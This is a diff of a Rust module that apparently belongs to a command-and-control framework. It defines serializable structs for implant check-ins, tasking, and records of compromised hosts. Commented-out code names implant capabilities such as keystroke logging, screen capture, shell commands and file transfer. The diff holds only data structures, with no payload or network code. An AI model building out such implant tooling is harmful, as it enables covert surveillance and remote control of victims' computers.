@@ -1,21 +1,76 @@
 use serde::{Serialize, Deserialize};
 pub mod actions;
-use actions::{RequestActionType, ResponseActionType};
+use actions::{c2_actions, RequestActionType, ResponseActionType};
 
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct CheckInResponse {
+    pub task: c2_actions,
+    pub task_parameters: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct PostRequest {
+    pub timestamp: u64,
+    pub action_type: c2_actions,
+    pub action_parameters: String,
+    pub content: Vec<u8>,
+}
+impl PostRequest {
+    pub fn new(timestamp: u64, action_type: c2_actions, action_parameters: String, content: Vec<u8>) -> Self {
+        PostRequest {
+            timestamp,
+            action_type,
+            action_parameters,
+            content,
+        }
+    }
+}
+
+#[derive(Serialize, Deserialize, Debug)]
 pub struct Inmate {
-    rowid: Option<i64>,
-    implant_id: Option<String>,
-    implant_type: Option<String>,
-    implant_version: Option<String>,
-    implant_os: Option<String>,
-    implant_arch: Option<String>,
-    implant_hostname: Option<String>,
-    implant_username: Option<String>,
-    implant_ip: Option<String>,
-    implant_pid: Option<i64>,
-    implant_last_checkin: Option<u32>,
-    pending_instruct: Option<String>,
-    pending_instruct_type: Option<ResponseActionType>,
+    pub rowid: i32,
+    pub os: String,
+    pub hostname: String,
+    pub ip: String,
+    pub pid: u32,
+    pub last_checkin: u32,
+    pub pending_instruct: String,
+    pub pending_instruct_type: c2_actions,
+}
+/* 
+
+pub fn RequestActionFromString(action: &str) -> RequestActionType {
+    match action {
+        "Keystrokes" => return RequestActionType::Keystrokes,
+        "ScreenCapture" => return RequestActionType::ScreenCapture,
+        "FileUpload" => return  RequestActionType::FileUpload,
+        "ShellResponse" => return RequestActionType::ShellResponse,
+        "SystemInfo" => return RequestActionType::SystemInfo,
+        "CheckIn" => return RequestActionType::CheckIn,
+        _ => return RequestActionType::CheckIn,
+    }
+}
+pub fn ResponseActionFromString(action: String) -> ResponseActionType {
+    match action.as_str() {
+        "CallAction" => return ResponseActionType::CallAction,
+        "ShellCommand" => return ResponseActionType::ShellCommand,
+        "FileDownload" => return ResponseActionType::FileDownload,
+        "FileUpload" => return ResponseActionType::FileUpload,
+        "Wait" => return ResponseActionType::Wait,
+        _ => return ResponseActionType::Wait,
+    }
+}
+#[derive(Debug)]
+pub struct Inmate {
+    pub rowid: i32,
+    pub os: String,
+    pub hostname: String,
+    pub ip: String,
+    pub pid: u32,
+    pub last_checkin: u32,
+    pub pending_instruct: String,
+    pub pending_instruct_type: ResponseActionType,
 }
 
 pub fn add(left: u64, right: u64) -> u64 {
@@ -29,7 +84,7 @@ pub struct C2Response {
 impl C2Response {
     pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType, message_content: String) -> Self {
         C2Response {
-            message_headers: ResponseHeaders::new(implant_id, timestamp, action_type),
+            message_headers: ResponseHeaders::new(implant_id, timestamp, action_type, "".to_string()),
             message_content,
         }
     }
@@ -39,14 +94,16 @@ pub struct ResponseHeaders {
     pub implant_id: String,
     pub timestamp: u64,
     pub action_type: ResponseActionType,
+    pub action_parameters: String,
 }
 
 impl ResponseHeaders {
-    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType) -> Self {
+    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType, param: String) -> Self {
         ResponseHeaders {
             implant_id,
             timestamp,
             action_type,
+            action_parameters: param,
         }
     }
 }
@@ -104,4 +161,4 @@ mod tests {
         let result = add(2, 2);
         assert_eq!(result, 4);
     }
-}
+}*/
